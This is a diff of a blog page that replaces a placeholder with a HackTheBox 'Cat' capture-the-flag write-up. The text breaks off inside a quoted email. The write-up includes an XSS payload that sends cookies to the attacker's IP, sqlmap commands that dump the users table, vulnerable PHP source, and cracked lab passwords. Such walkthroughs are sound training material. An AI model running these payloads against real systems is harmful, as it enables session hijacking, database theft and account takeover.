@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Cat - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Cat.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Cat machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Cat machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Cat, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,274 @@
         <h1 class="writeup-title">Cat</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">July 5, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Cat" src="../images/Cat/pwned.png" /></p>
-<p>Cat is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Cat retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Cat/pwned.png" /></p>
+<p>Cat was a medium-difficulty Linux box featuring SSH on port 22 and a custom web application on port 80.
+Initial reconnaissance revealed a cat contest website with registration functionality, where I discovered an XSS vulnerability in the username field.
+By registering with a malicious JavaScript payload, I captured the admin's session cookies when they viewed submissions.</p>
+<p>Directory enumeration exposed a .git repository, which I extracted using git-dumper to obtain the application's source code.
+Analysis revealed the backend used SQLite and identified a SQL injection vulnerability in the accept_cat.php endpoint.
+The vulnerable query directly concatenated user input: INSERT INTO accepted_cats (name) VALUES ('$cat_name').
+Using sqlmap with the captured admin session, I extracted user credentials from the database and cracked the MD5 hashes, revealing credentials for user Rosa.</p>
+<p>SSH access as Rosa provided limited privileges, but examining Apache logs revealed Axel's credentials (axel:aNdZwgC4tI9gnVXv_e3Q) from his repeated login attempts.
+After escalating to the Axel account, I discovered a local Gitea instance running on port 3000. Port forwarding revealed a vulnerable Gitea installation susceptible to stored XSS in repository descriptions.</p>
+<p>Privilege escalation involved crafting a sophisticated XSS payload that used JavaScript's fetch API to exfiltrate sensitive files from an administrator-only repository.
+The payload was triggered when an admin reviewed repositories per the internal email workflow.
+This attack successfully captured admin credentials (admin:IKw75eR0MR7CMIxhH0) from a private employee management system, which provided root access to complete the machine.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Cat/nmap.png" /></p>
+<p>Nmap scan reveals 2 ports. SSH on 22 and a website on 80.</p>
+<h2>XSS via the username field</h2>
+<p><img alt="website" src="../images/Cat/website.png" /></p>
+<p>There are a few buttons at the top, and clicking on join sends me to a registeration form.</p>
+<p><img alt="register" src="../images/Cat/register.png" /></p>
+<p>I'll register an account, putting this XSS payload into the username field for testing.</p>
+<p><code>&lt;script&gt;new Image().src="http://10.10.16.94:8000/xss?" + document.cookie;&lt;/script&gt;</code></p>
+<p>If the username is not sanitized properly, I'll be able to get cookies of any user who stumbles upon my username.</p>
+<p>After succesfully registering, I can check the contest button without getting redirected back to the form.</p>
+<p><img alt="form" src="../images/Cat/form.png" /></p>
+<p>I could try XSS here as well, in the cat name form. If someone were to check this submission, I could get their cookies.</p>
+<p><img alt="error" src="../images/Cat/error.png" /></p>
+<p>However, some special characters are blocked in this form. I could deduct which ones are, but it could also be blocking <em>all</em> of them, which would waste a lot of time.</p>
+<p>Instead, I'll simply send the form without meddling with it, remembering that my username still contains the XSS payload from earlier.</p>
+<p><img alt="succss" src="../images/Cat/succss.png" /></p>
+<p>And after a moment, I got a callback on my python server.</p>
+<p><img alt="cookie" src="../images/Cat/cookie.png" /></p>
+<h2>Dumping the git repo</h2>
+<p>Getting the admin cookie didn't reveal anything right away. The admin endpoint was completely empty.</p>
+<p><img alt="cats" src="../images/Cat/cats.png" /></p>
+<p>I decided to search for any files I could grab. I'll run dirsearch first without any additional flags.</p>
+<p><code>dirsearch -u http://cat.htb/</code></p>
+<p><img alt="crash" src="../images/Cat/crash.png" /></p>
+<p>While it was stopped at 51% due to sending too many requests, it found a .git directory and a config.php file. I can't grab the config file with curl, but I can dump the entire .git folder using gitdumper.</p>
+<p><code>git-dumper http://cat.htb .git</code></p>
+<p><img alt="catdump" src="../images/Cat/catdump.png" /></p>
+<h2>SQL injection</h2>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">contest</span><span class="p">.</span><span class="nx">php</span><span class="w"> </span><span class="nx">snippet</span>
+
+<span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span>
+
+<span class="c1">// Message variables</span>
+<span class="nv">$success_message</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="nv">$error_message</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+
+<span class="c1">// Check if the user is logged in</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: /join.php&quot;</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="c1">// Function to check for forbidden content</span>
+<span class="k">function</span> <span class="nf">contains_forbidden_content</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$pattern</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Check if the form has been submitted</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Capture form data</span>
+    <span class="nv">$cat_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cat_name&#39;</span><span class="p">];</span>
+    <span class="nv">$age</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
+    <span class="nv">$birthdate</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;birthdate&#39;</span><span class="p">];</span>
+    <span class="nv">$weight</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;weight&#39;</span><span class="p">];</span>
+
+    <span class="nv">$forbidden_patterns</span> <span class="o">=</span> <span class="s2">&quot;/[+*{}&#39;,;&lt;&gt;()</span><span class="se">\\</span><span class="s2">[</span><span class="se">\\</span><span class="s2">]</span><span class="se">\\</span><span class="s2">/</span><span class="se">\\</span><span class="s2">:]/&quot;</span><span class="p">;</span>
+
+    <span class="c1">// Check for forbidden content</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">contains_forbidden_content</span><span class="p">(</span><span class="nv">$cat_name</span><span class="p">,</span> <span class="nv">$forbidden_patterns</span><span class="p">)</span> <span class="o">||</span>
+        <span class="nx">contains_forbidden_content</span><span class="p">(</span><span class="nv">$age</span><span class="p">,</span> <span class="nv">$forbidden_patterns</span><span class="p">)</span> <span class="o">||</span>
+        <span class="nx">contains_forbidden_content</span><span class="p">(</span><span class="nv">$birthdate</span><span class="p">,</span> <span class="nv">$forbidden_patterns</span><span class="p">)</span> <span class="o">||</span>
+        <span class="nx">contains_forbidden_content</span><span class="p">(</span><span class="nv">$weight</span><span class="p">,</span> <span class="nv">$forbidden_patterns</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$error_message</span> <span class="o">=</span> <span class="s2">&quot;Your entry contains invalid characters.&quot;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// Generate unique identifier for the image</span>
+        <span class="nv">$imageIdentifier</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;_&quot;</span><span class="p">;</span>
+</code></pre></div>
+
+<p>These are the banned characters. Manual deduction would have taken quite a lot of time, and would not yield much results.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">config</span><span class="p">.</span><span class="nx">php</span>
+
+<span class="cp">&lt;?php</span>
+<span class="c1">// Database configuration</span>
+<span class="nv">$db_file</span> <span class="o">=</span> <span class="s1">&#39;/databases/cat.db&#39;</span><span class="p">;</span>
+
+<span class="c1">// Connect to the database</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s2">&quot;sqlite:</span><span class="si">$db_file</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Error: &quot;</span> <span class="o">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>The website is using an sqlite database, which is located at <code>/databases/cat.db</code>. This is an important detail that I'll note for later.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">accept_cat</span><span class="p">.</span><span class="nx">php</span>
+
+<span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;axel&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;catId&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;catName&#39;</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="nv">$cat_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;catName&#39;</span><span class="p">];</span>
+            <span class="nv">$catId</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;catId&#39;</span><span class="p">];</span>
+            <span class="nv">$sql_insert</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO accepted_cats (name) VALUES (&#39;</span><span class="si">$cat_name</span><span class="s2">&#39;)&quot;</span><span class="p">;</span>
+            <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$sql_insert</span><span class="p">);</span>
+
+            <span class="nv">$stmt_delete</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;DELETE FROM cats WHERE cat_id = :cat_id&quot;</span><span class="p">);</span>
+            <span class="nv">$stmt_delete</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:cat_id&#39;</span><span class="p">,</span> <span class="nv">$catId</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
+            <span class="nv">$stmt_delete</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+
+            <span class="k">echo</span> <span class="s2">&quot;The cat has been accepted and added successfully.&quot;</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&quot;Error: Cat ID or Cat Name not provided.&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: /&quot;</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&quot;Access denied.&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>There is an SQLi vulnerability in the sql_insert query. It is passing the user controlled <code>catName</code> parameter into the query, without any kind of sanitization.</p>
+<p>I'll run sqlmap in order to quickly find the injection point and extract data. First, I will map out what tables are there to enumerate.</p>
+<p><code>sqlmap -u http://cat.htb/accept_cat.php --cookie='PHPSESSID=t0sjk4fh55tn5i1meqgcqsc3lj' -p catName --dbms=SQLite --data="catId=1&amp;catName=test" --level=5 --tables</code></p>
+<p><img alt="data" src="../images/Cat/data.png" /></p>
+<p>As expected, the <code>users</code> table is my target. I will rerun the same command, this time specifying the table to dump.</p>
+<p><code>sqlmap -u http://cat.htb/accept_cat.php --cookie='PHPSESSID=t0sjk4fh55tn5i1meqgcqsc3lj' -p catName --dbms=SQLite --data="catId=1&amp;catName=test" --level=5 --dump -T users --threads 4</code></p>
+<p><img alt="hashes" src="../images/Cat/hashes.png" /></p>
+<p>I got a bunch of hashes, and they look like MD5 hashes. There's no need to try cracking them if that's the case, as I can use crackstation to quickly find passwords for these hashes.</p>
+<p><code>https://crackstation.net/</code></p>
+<p><img alt="rosa" src="../images/Cat/rosa.png" /></p>
+<p><code>rosa | soyunaprincesarosa</code></p>
+<p>I'll try to SSH into the box with these credentials.</p>
+<p><img alt="fakeuser" src="../images/Cat/fakeuser.png" /></p>
+<p>There was no user flag in Rosa's home directory.</p>
+<h2>Reading the apache logs</h2>
+<p>I ran a command to list every directory readable by Rosa.</p>
+<p><code>find / -type d -readable 2&gt;/dev/null</code></p>
+<p>It returned lots of directories as a result, but I found one in particular that caught my eye.</p>
+<p><img alt="log" src="../images/Cat/log.png" /></p>
+<p>Rosa can read the files in /var/log. I'll run a recursive grep in that directory, searching for mentions of other users who have a home directory on the box.</p>
+<p><code>grep -r axel</code></p>
+<p><img alt="login" src="../images/Cat/login.png" /></p>
+<p>It looks like Axel is constantly trying to login into the website via the join form. I'll quickly test whether this password works as his login for the box as well.</p>
+<p>I can do so from the level of my SSH shell by using su.</p>
+<p><code>axel | aNdZwgC4tI9gnVXv_e3Q</code></p>
+<p><code>su axel</code></p>
+<p><img alt="user" src="../images/Cat/user.png" /></p>
+<h1>Root flag</h1>
+<p>I looked around for anything interesting, and I found a local service running on the box.</p>
+<p><img alt="service" src="../images/Cat/service.png" /></p>
+<p>I will forward port 3000 to my box. I'll SSH into the machine as Axel, specifying a port to forward.</p>
+<p><code>ssh axel@cat.htb -L 3000:127.0.0.1:3000</code></p>
+<h2>XSS on Gitea</h2>
+<p>After visiting the address in my browser, I saw a locally hosted Gitea instance.</p>
+<p><img alt="gitea" src="../images/Cat/gitea.png" /></p>
+<p>With a version listed in the footer.</p>
+<p><img alt="version" src="../images/Cat/version.png" /></p>
+<p>I searched for exploits tied to this version, and I found a stored XSS vulnerability.</p>
+<p><code>https://www.exploit-db.com/exploits/52077</code></p>
+<p>I need a valid user to login with on Gitea. Looking at the users tab, I can see 2 users I've already owned.</p>
+<p><img alt="users" src="../images/Cat/users.png" /></p>
+<p>Axel's credentials work. I can now create repositories, so I'll try to confirm that the XSS vulnerability exists here.</p>
+<p>Following the steps outlined in the exploit-db entry, I created a repo and added the XSS payload to its description.</p>
+<p><img alt="works" src="../images/Cat/works.png" /></p>
+<h2>Crafting the XSS payload, and the malicious mail</h2>
+<p>When I first logged in as Axel via SSH, I noticed that there was a new mail to read.</p>
+<p><img alt="mail" src="../images/Cat/mail.png" /></p>
+<p>In linux, mails can be stored at /var/mail{user}. If I want to see emails sent to Axel, I'd read <code>/var/mail/axel</code>.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">From</span><span class="w"> </span><span class="n">rosa</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="w">  </span><span class="n">Sat</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">51</span><span class="err">:</span><span class="mi">50</span><span class="w"> </span><span class="mi">2024</span>
+<span class="k">Return</span><span class="o">-</span><span class="k">Path</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">rosa</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">cat</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="n">localhost</span><span class="w"> </span><span class="o">[</span><span class="n">127.0.0.1</span><span class="o">]</span><span class="p">)</span>
+<span class="w">        </span><span class="k">by</span><span class="w"> </span><span class="n">cat</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">8.15.2</span><span class="o">/</span><span class="mf">8.15.2</span><span class="o">/</span><span class="n">Debian</span><span class="o">-</span><span class="mi">18</span><span class="p">)</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">ESMTP</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="mi">48</span><span class="n">S4pnXk001592</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="o">&lt;</span><span class="n">axel</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span><span class="p">;</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">51</span><span class="err">:</span><span class="mi">50</span><span class="w"> </span><span class="n">GMT</span>
+<span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="k">from</span><span class="w"> </span><span class="n">rosa</span><span class="nv">@localhost</span><span class="p">)</span>
+<span class="w">        </span><span class="k">by</span><span class="w"> </span><span class="n">cat</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">8.15.2</span><span class="o">/</span><span class="mf">8.15.2</span><span class="o">/</span><span class="n">Submit</span><span class="p">)</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="mi">48</span><span class="n">S4pnlT001591</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">axel</span><span class="nv">@localhost</span><span class="p">;</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">51</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="n">GMT</span>
+<span class="nc">Date</span><span class="err">:</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">51</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="n">GMT</span>
+<span class="k">From</span><span class="err">:</span><span class="w"> </span><span class="n">rosa</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span>
+<span class="n">Message</span><span class="o">-</span><span class="nl">Id</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">202409280451.48</span><span class="n">S4pnlT001591</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">services</span>
+
+<span class="n">Hi</span><span class="w"> </span><span class="n">Axel</span><span class="p">,</span>
+
+<span class="n">We</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">planning</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">launch</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">cat</span><span class="o">-</span><span class="n">related</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">services</span><span class="p">,</span><span class="w"> </span><span class="n">including</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">care</span><span class="w"> </span><span class="n">website</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">projects</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">jobert</span><span class="nv">@localhost</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">Gitea</span><span class="w"> </span><span class="n">repository</span><span class="p">.</span><span class="w"> </span><span class="n">Jobert</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">promising</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">develop</span><span class="p">.</span>
+
+<span class="n">Important</span><span class="w"> </span><span class="nl">note</span><span class="p">:</span><span class="w"> </span><span class="n">Be</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">include</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">clear</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">idea</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">understand</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">properly</span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">review</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">whole</span><span class="w"> </span><span class="n">repository</span><span class="p">.</span>
+
+<span class="k">From</span><span class="w"> </span><span class="n">rosa</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="w">  </span><span class="n">Sat</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">05</span><span class="err">:</span><span class="mi">28</span><span class="w"> </span><span class="mi">2024</span>
+<span class="k">Return</span><span class="o">-</span><span class="k">Path</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">rosa</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">cat</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="n">localhost</span><span class="w"> </span><span class="o">[</span><span class="n">127.0.0.1</span><span class="o">]</span><span class="p">)</span>
+<span class="w">        </span><span class="k">by</span><span class="w"> </span><span class="n">cat</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">8.15.2</span><span class="o">/</span><span class="mf">8.15.2</span><span class="o">/</span><span class="n">Debian</span><span class="o">-</span><span class="mi">18</span><span class="p">)</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">ESMTP</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="mi">48</span><span class="n">S55SRY002268</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="o">&lt;</span><span class="n">axel</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span><span class="p">;</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">05</span><span class="err">:</span><span class="mi">28</span><span class="w"> </span><span class="n">GMT</span>
+<span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="k">from</span><span class="w"> </span><span class="n">rosa</span><span class="nv">@localhost</span><span class="p">)</span>
+<span class="w">        </span><span class="k">by</span><span class="w"> </span><span class="n">cat</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">8.15.2</span><span class="o">/</span><span class="mf">8.15.2</span><span class="o">/</span><span class="n">Submit</span><span class="p">)</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="mi">48</span><span class="n">S55Sm0002267</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">axel</span><span class="nv">@localhost</span><span class="p">;</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">05</span><span class="err">:</span><span class="mi">28</span><span class="w"> </span><span class="n">GMT</span>
+<span class="nc">Date</span><span class="err">:</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">05</span><span class="err">:</span><span class="mi">28</span><span class="w"> </span><span class="n">GMT</span>
+<span class="k">From</span><span class="err">:</span><span class="w"> </span><span class="n">rosa</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span>
+<span class="n">Message</span><span class="o">-</span><span class="nl">Id</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">202409280505.48</span><span class="n">S55Sm0002267</span><span class="nv">@cat</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">Employee</span><span class="w"> </span><span class="n">management</span>
+
+<span class="n">We</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">currently</span><span class="w"> </span><span class="n">developing</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">employee</span><span class="w"> </span><span class="n">management</span><span class="w"> </span><span class="k">system</span><span class="p">.</span><span class="w"> </span><span class="k">Each</span><span class="w"> </span><span class="n">sector</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">assigned</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">specific</span><span class="w"> </span><span class="k">role</span><span class="p">,</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="k">each</span><span class="w"> </span><span class="n">employee</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">able</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">consult</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">assigned</span><span class="w"> </span><span class="n">tasks</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">project</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">still</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="n">development</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">hosted</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">private</span><span class="w"> </span><span class="n">Gitea</span><span class="p">.</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">visit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">repository</span><span class="w"> </span><span class="k">at</span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span 